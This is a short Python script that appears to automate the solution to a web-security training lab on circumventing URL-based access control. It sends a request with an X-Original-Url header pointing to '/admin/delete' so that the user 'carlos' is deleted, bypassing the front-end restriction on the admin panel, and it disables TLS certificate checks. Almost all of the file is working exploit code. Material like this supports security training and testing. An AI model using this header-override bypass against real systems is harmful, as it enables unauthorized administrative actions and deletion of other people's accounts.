import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "URL-based access control can be circumvented"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Add the X-Original-URL header to the request\n2. Delete carlos from the admin panel\n""")

    print(Fore.WHITE +
          "[+] Deleting carlos with X-Original-URL header in the request")
    headers = {"X-Original-Url": "/admin/delete"}

    try:
        r = requests.get(
            f"{url}?username=carlos", headers=headers, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
